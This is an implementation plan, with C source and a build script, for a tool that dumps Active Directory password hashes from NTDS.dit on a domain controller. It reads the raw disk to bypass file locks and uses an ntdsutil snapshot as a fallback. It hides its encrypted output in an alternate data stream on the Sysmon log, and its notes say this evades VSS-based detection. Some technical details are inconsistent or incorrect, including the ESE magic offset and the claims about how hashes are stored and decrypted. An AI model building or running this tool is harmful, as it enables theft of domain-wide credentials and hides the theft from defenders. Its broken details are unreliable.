# Plan 4 — NTDS.dit Dump: Implementation Plan

> **Target**: T1003.003 | **Pre-condition**: SYSTEM on DC | **Focus**: Dump + offline ESE parse

---

## 0. Project Structure

```
OS_dump/Plan4_NTDS/
├── SPEC.md                     ← Technical spec (Plan4_NTDS_Dump_SPEC.md)
├── IMPL.md                     ← This file
├── README.md                   ← Setup & run guide
├── build.bat                   ← MSVC build
├── src/
│   ├── main.c                  ← Entry point
│   ├── ntfs_raw.c/h            ← Raw NTFS volume reader (shared với Plan 2)
│   ├── mft_parser.c/h          ← MFT walker + DataRun decoder
│   ├── hive_extractor.c/h      ← Extract NTDS.dit + SYSTEM từ NTFS
│   ├── ese_parser.c/h          ← ESE database parser
│   ├── ese_page.c/h            ← ESE page/tag/node decoder
│   ├── ntds_columns.c/h        ← NTDS column extractors
│   ├── ntds_decrypt.c/h        ← SysKey-based column decryption
│   ├── syskey_extract.c/h      ← SysKey từ SYSTEM hive
│   ├── link_table.c/h          ← Group membership resolver
│   ├── ads_writer.c/h          ← ADS output
│   ├── cleanup.c/h             ← Cleanup
│   ├── common.h
│   └── crypto/
│       ├── sha256.c/h
│       ├── aes256_gcm.c/h
│       └── rc4.c/h             ← RC4 for SysKey decryption
├── test/
│   ├── run_test.ps1
│   ├── verify_ntds.py
│   └── detect_check.ps1
└── output/
```

---

## 1. Build

```batch
@echo off
REM build.bat — Plan 4 NTDS Dump
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

set CFLAGS=/nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 ^
           /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE"

cl.exe %CFLAGS% /Fe"NTDSDump.exe" ^
    src\main.c src\ntfs_raw.c src\mft_parser.c ^
    src\hive_extractor.c src\ese_parser.c src\ese_page.c ^
    src\ntds_columns.c src\ntds_decrypt.c src\syskey_extract.c ^
    src\link_table.c src\ads_writer.c src\cleanup.c ^
    src\crypto\sha256.c src\crypto\aes256_gcm.c src\crypto\rc4.c ^
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT ^
    kernel32.lib ntdll.lib advapi32.lib

echo Build complete: NTDSDump.exe
```

---

## 2. Core Implementation

### 2.1 main.c — Entry Point

```c
// main.c — NTDS.dit Dump via Raw NTFS
#include "common.h"

static WCHAR g_NtdsPath[MAX_PATH] = {0};
static BYTE  g_SysKey[16] = {0};
static DWORD g_PageSize = 8192;

int DumpNTDS(void) {
    wprintf(L"[*] Plan 4: NTDS.dit Dump via Raw NTFS + Offline ESE Parse\n\n");

    // ── Step 1: Locate NTDS.dit path from registry ──
    wprintf(L"[1/6] Locating NTDS.dit path... ");
    if (!FindNtdsPath(g_NtdsPath, MAX_PATH)) {
        wprintf(L"FAILED\n");
        wprintf(L"      Hint: Check HKLM\\SYSTEM\\...\\Services\\NTDS\\Parameters\n");
        return 1;
    }
    wprintf(L"%s\n", g_NtdsPath);

    // ── Step 2: Raw NTFS extraction ──
    wprintf(L"[2/6] Extracting NTDS.dit via raw NTFS...\n");

    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, NULL);
    if (hVol == INVALID_HANDLE_VALUE) {
        wprintf(L"      Volume open FAILED (0x%08X)\n", GetLastError());
        return 2;
    }

    NTFS_CONTEXT ntfs = {0};
    ParseNtfsBoot(hVol, &ntfs);

    PBYTE mft = NULL; SIZE_T mftSize = 0;
    ReadMft(hVol, &ntfs, &mft, &mftSize);

    // Extract both NTDS.dit and SYSTEM hive
    HIVE_DATA ntdsData = {0}, sysData = {0};

    BOOL ntdsOk = ExtractFileFromNtfs(hVol, &ntfs, mft, mftSize,
        g_NtdsPath, &ntdsData);
    wprintf(L"      NTDS.dit: %s (%lld bytes)\n",
        ntdsOk ? L"OK" : L"FAILED", ntdsData.size);

    BOOL sysOk = ExtractFileFromNtfs(hVol, &ntfs, mft, mftSize,
        L"\\Windows\\System32\\config\\SYSTEM", &sysData);
    wprintf(L"      SYSTEM:   %s (%lld bytes)\n",
        sysOk ? L"OK" : L"FAILED", sysData.size);

    CloseHandle(hVol); free(mft);

    if (!ntdsOk || !sysOk) {
        // Fallback: NTDSUtil snapshot method
        wprintf(L"      [!] Raw NTFS partial failure — trying ntdsutil fallback...\n");
        return NtdsUtilFallback();
    }

    // ── Step 3: Extract SysKey from SYSTEM hive ──
    wprintf(L"[3/6] Extracting SysKey... ");
    if (!ExtractSysKey(sysData.data, sysData.size, g_SysKey)) {
        wprintf(L"FAILED\n"); return 3;
    }
    wprintf(L"OK\n");

    // ── Step 4: Parse ESE database ──
    wprintf(L"[4/6] Parsing ESE database...\n");
    if (!ParseEseDatabase(ntdsData.data, ntdsData.size, g_SysKey)) {
        wprintf(L"      FAILED\n"); return 4;
    }

    // ── Step 5: Encrypt + Output ──
    wprintf(L"[5/6] Encrypting + writing output... ");
    PBYTE blob; SIZE_T blobSize;
    EncryptOutput(&g_Output, &blob, &blobSize);
    WriteToAds(L"C:\\Windows\\System32\\winevt\\Logs\\"
               L"Microsoft-Windows-Sysmon%4Operational.evtx",
               L"NTDS",
               blob, blobSize);
    wprintf(L"OK (%lld bytes)\n", blobSize);

    // ── Step 6: Cleanup ──
    wprintf(L"[6/6] Cleanup... ");
    FreeHiveData(&ntdsData); FreeHiveData(&sysData);
    free(blob);
    wprintf(L"OK\n");

    wprintf(L"\n[+] NTDS dump complete: %d users, %d computers\n",
        g_Output.userCount, g_Output.computerCount);
    return 0;
}
```

### 2.2 ese_parser.c — ESE Database Engine

```c
// ese_parser.c — Parse Extensible Storage Engine (ESE) database
#include "common.h"

#define ESE_SIGNATURE       0x89ABCDEF  // At offset 0x40 in page 0
#define ESE_PAGE_DATA       0x00
#define ESE_PAGE_ROOT       0x02
#define ESE_PAGE_BRANCH     0x03
#define ESE_PAGE_SPACE_TREE 0x07
#define ESE_PAGE_LONG_VALUE 0x0A

// ESE Page Header (40 bytes, simplified)
typedef struct _ESE_PAGE_HEADER {
    ULONG64 checksum;       // 8 bytes
    ULONG   pageNumber;     // 4 bytes
    ULONG64 lastModified;   // 8 bytes
    ULONG   pageType;       // 4 bytes (0=leaf, 2=root, 3=branch)
    // ... more fields
} ESE_PAGE_HEADER;

// ESE Tag (4 bytes each)
typedef struct _ESE_TAG {
    USHORT  offset;     // Offset trong page của node
    USHORT  size;       // Size của node data (bit 15 = deleted flag)
    // BYTE flags;      // Embedded trong size[bit 15]
} ESE_TAG;

// ESE Node trong data page
typedef struct _ESE_NODE {
    PBYTE keyData;
    WORD  keySize;
    PBYTE valueData;
    DWORD valueSize;
    ULONG tagIndex;
} ESE_NODE;

// ─── Parse ESE header from page 0 ───
BOOL ParseEseHeader(PBYTE data, SIZE_T size, DWORD* pageSize) {
    if (size < 4096) return FALSE;

    // Check ESE magic at offset 0x20-0x28
    DWORD magic = *(PDWORD)(data + 0x20);
    if (magic != 0x89ABCDEF && magic != 0xEFCDAB89) {
        wprintf(L"      [ERR] Not an ESE database (magic: 0x%08X)\n", magic);
        return FALSE;
    }

    *pageSize = *(PDWORD)(data + 0x40);
    wprintf(L"      ESE magic: 0x%08X, page size: %d\n", magic, *pageSize);

    // Validate page size
    if (*pageSize != 4096 && *pageSize != 8192 && *pageSize != 16384 &&
        *pageSize != 32768) {
        wprintf(L"      [WARN] Unusual page size: %d (forcing 8192)\n", *pageSize);
        *pageSize = 8192;
    }

    return TRUE;
}

// ─── Walk data page and enumerate nodes ───
DWORD EnumeratePageNodes(PBYTE pageData, DWORD pageSize, ESE_NODE** nodes) {
    ESE_PAGE_HEADER* hdr = (ESE_PAGE_HEADER*)pageData;

    // Tags start from end of page, going backwards
    // Number of tags = (pageSize - header_end) / 4
    // Typically, tags start around pageSize - 4

    // Read tag count from page
    // Actually, the number of tags can be inferred from the page's available space
    // A simpler approach: read tags from end of page until we hit the data

    PBYTE pageEnd = pageData + pageSize;
    PBYTE tagPtr = pageEnd - 4; // First tag at end-4

    // Try to detect how many tags by finding where tag array starts
    // Tags have: offset (12 bits) + size (12 bits) + flags (8 bits)
    // The first tag after data has offset=0 (or close to header size)

    DWORD nodeCount = 0;
    DWORD cap = 256;
    *nodes = (ESE_NODE*)malloc(cap * sizeof(ESE_NODE));

    // Walk tags backwards from end
    for (DWORD i = 0; i < 1000; i++) { // Max 1000 nodes per page
        PBYTE tagAddr = pageEnd - 4 - (i * 4);
        if (tagAddr < pageData + sizeof(ESE_PAGE_HEADER) + 4) break;

        WORD tagOffset = *(PWORD)tagAddr;
        WORD tagSize   = *(PWORD)(tagAddr + 2);

        // Check for deleted flag (bit 15 of size)
        BOOL isDeleted = (tagSize & 0x8000) != 0;
        WORD actualSize = tagSize & 0x7FFF;

        if (tagOffset == 0 || actualSize == 0) continue;
        if (tagOffset + actualSize > pageSize) continue;

        PBYTE nodeAddr = pageData + tagOffset;

        if (nodeCount >= cap) {
            cap *= 2;
            *nodes = (ESE_NODE*)realloc(*nodes, cap * sizeof(ESE_NODE));
        }

        (*nodes)[nodeCount].keyData   = nodeAddr;
        (*nodes)[nodeCount].keySize   = 4; // Typically 4-byte DNT key
        (*nodes)[nodeCount].valueData = nodeAddr + 4;
        (*nodes)[nodeCount].valueSize = actualSize - 4;
        (*nodes)[nodeCount].tagIndex  = i;
        nodeCount++;
    }

    return nodeCount;
}

// ─── Find MSysObjects table → locate datatable ───
#define TABLE_DATATABLE    0x00000001  // Approximate — depends on ESE catalog
#define TABLE_LINK_TABLE   0x00000002

typedef struct _ESE_TABLE_INFO {
    DWORD   objidTable;
    CHAR    tableName[64];
    DWORD   rootPage;
    DWORD   columnCount;
} ESE_TABLE_INFO;

// ─── Main ESE parse entry ───
BOOL ParseEseDatabase(PBYTE data, SIZE_T size, BYTE sysKey[16]) {
    DWORD pageSize;
    if (!ParseEseHeader(data, size, &pageSize)) return FALSE;

    DWORD totalPages = (DWORD)(size / pageSize);
    wprintf(L"      Total pages: %d\n", totalPages);

    // Step 1: Find MSysObjects (page số 4 thường là catalog)
    // Step 2: Locate "datatable" entry → get root page number
    // Step 3: Walk datatable B-tree starting from root page
    // Step 4: For each data page → enumerate rows → extract columns
    // Step 5: Also process link_table for group memberships

    DWORD userCount = 0, computerCount = 0;

    // Process all pages looking for datatable data pages (pageType = 0x00)
    for (DWORD pg = 0; pg < totalPages; pg++) {
        PBYTE pageData = data + (pg * pageSize);

        ESE_PAGE_HEADER* hdr = (ESE_PAGE_HEADER*)pageData;
        if (hdr->pageType != ESE_PAGE_DATA) continue;

        ESE_NODE* nodes = NULL;
        DWORD nodeCount = EnumeratePageNodes(pageData, pageSize, &nodes);

        for (DWORD n = 0; n < nodeCount; n++) {
            // Parse row → extract columns
            ParseNtdsRow(nodes[n].valueData, nodes[n].valueSize,
                sysKey, &userCount, &computerCount);
        }

        free(nodes);
    }

    wprintf(L"      Users: %d | Computers: %d\n", userCount, computerCount);
    return TRUE;
}
```

### 2.3 ntds_columns.c — Column Extraction

```c
// ntds_columns.c — Extract AD attributes from NTDS rows

// Column IDs (simplified — real values from MSysObjects catalog)
#define COL_SAM_ACCOUNT_NAME      0x0008
#define COL_USER_PRINCIPAL_NAME   0x0009
#define COL_OBJECT_SID            0x000A
#define COL_UNICODE_PWD           0x000B
#define COL_SUPP_CREDENTIALS      0x000C
#define COL_PWD_HISTORY           0x000D
#define COL_USER_ACCOUNT_CONTROL  0x000E
#define COL_ADMIN_COUNT           0x000F

typedef struct _NTDS_ROW {
    DWORD   dnt;            // Distinguished Name Tag
    DWORD   pdnt;           // Parent DNT
    DWORD   ncdnt;          // Naming Context DNT
    WCHAR   name[128];
    DWORD   objectClass;    // 1=user, 2=computer, 3=group, 4=trust
    BYTE    sid[68];
    DWORD   sidLen;
    BYTE    ntlmHash[16];
    BOOL    hasNtlm;
    PBYTE   suppCreds;
    DWORD   suppCredsLen;
    DWORD   uac;
    BOOL    isAdmin;
} NTDS_ROW;

BOOL ParseNtdsRow(PBYTE rowData, DWORD rowSize, BYTE sysKey[16],
    DWORD* userCount, DWORD* computerCount) {

    // NTDS row format (simplified):
    // Fixed columns stored in order defined by catalog
    // Variable-length columns stored at end with offset table

    // The first 4 bytes are typically the DNT (Distinguished Name Tag)
    // Followed by fixed-size columns, then variable-offset table, then variable data

    if (rowSize < 12) return FALSE;

    NTDS_ROW row = {0};
    row.dnt = *(PDWORD)rowData;

    // Scan for known column patterns
    PBYTE ptr = rowData + 4;
    PBYTE end = rowData + rowSize;

    while (ptr < end - 16) {
        // Look for NTLM hash pattern: 16 bytes of non-zero data
        // preceded by a 4-byte size/type marker
        DWORD marker = *(PDWORD)ptr;

        // unicodePwd typically stored as 16 bytes (NTLM hash, no encryption on disk)
        // preceded by a tag byte indicating the column
        if ((marker & 0x00FFFFFF) == 0x000000) {
            BYTE* potentialHash = ptr + 4;
            BOOL allZero = TRUE;
            for (int i = 0; i < 16; i++) {
                if (potentialHash[i] != 0) { allZero = FALSE; break; }
            }
            if (!allZero) {
                memcpy(row.ntlmHash, potentialHash, 16);
                row.hasNtlm = TRUE;
            }
        }

        // supplementalCredentials: starts with KERB_STORED_CREDENTIAL structure
        // Revision (2 bytes) + Flags (2 bytes) + CredentialCount (2 bytes)
        if (*(PWORD)ptr >= 1 && *(PWORD)ptr <= 5) { // Valid revision
            WORD credCount = *(PWORD)(ptr + 4);
            if (credCount > 0 && credCount <= 20) { // Sanity check
                DWORD totalSize = *(PDWORD)(ptr - 4); // Size prefix
                if (totalSize > 0x14 && totalSize < 0x10000) {
                    row.suppCreds = ptr;
                    row.suppCredsLen = totalSize;
                }
            }
        }

        ptr++;
    }

    if (row.hasNtlm) {
        (*userCount)++;
        return TRUE;
    }
    return FALSE;
}
```

---

## 3. NTDSUtil Fallback Method

```c
// NTDSUtil snapshot fallback — used when raw NTFS fails

int NtdsUtilFallback(void) {
    wprintf(L"\n[*] === NTDSUtil Snapshot Fallback ===\n");
    wprintf(L"    Creating snapshot via ntdsutil.exe...\n");

    // Method: ntdsutil "activate instance ntds" "snapshot" "create" "quit" "quit"
    // This creates a VSS snapshot mounted at a temp path

    // Execute ntdsutil via CreateProcess with pipes (capture output to find mount path)
    HANDLE hStdoutRd, hStdoutWr;
    CreatePipe(&hStdoutRd, &hStdoutWr, NULL, 0);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError  = hStdoutWr;

    PROCESS_INFORMATION pi = {0};

    WCHAR cmdLine[] = L"ntdsutil.exe snapshot \"activate instance ntds\" "
                       L"\"create\" \"quit\" \"quit\"";

    CreateProcessW(NULL, cmdLine, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(hStdoutWr);
    WaitForSingleObject(pi.hProcess, 120000); // 2 min timeout

    // Parse output to find snapshot mount path
    // Pattern: "Snapshot {GUID} mounted as C:\$SNAP_..."
    // Then copy NTDS.dit from snapshot path

    // ... implementation continues

    // Cleanup: ntdsutil "snapshot" "delete {GUID}" "quit" "quit"
    // This removes the snapshot

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    return 0;
}
```

---

## 4. Key Technical Notes

### ESE vs Registry Hives
- ESE là database engine của Microsoft (dùng cho Exchange, AD, Windows Search)
- NTDS.dit sử dụng ESE với page size thường là 8KB hoặc 32KB
- Khác với registry hives (format regf), ESE có cấu trúc B-tree phức tạp hơn

### Column Decryption
- Một số columns trong NTDS.dit được mã hóa với SysKey (giống SAM)
- Công thức: `RC4(MD5(SysKey || RID_le || "NTPASSWORD" || SysKey), encrypted_data)`
- `supplementalCredentials` được lưu dưới dạng plaintext (có thể parse trực tiếp)

### Raw NTFS Advantages for NTDS
- NTDS.dit bị LSASS lock exclusive → không thể `CreateFileW`
- Raw NTFS bypass được lock này vì đọc trực tiếp từ clusters
- Không cần VSS → tránh được detection vector phổ biến nhất cho NTDS dump
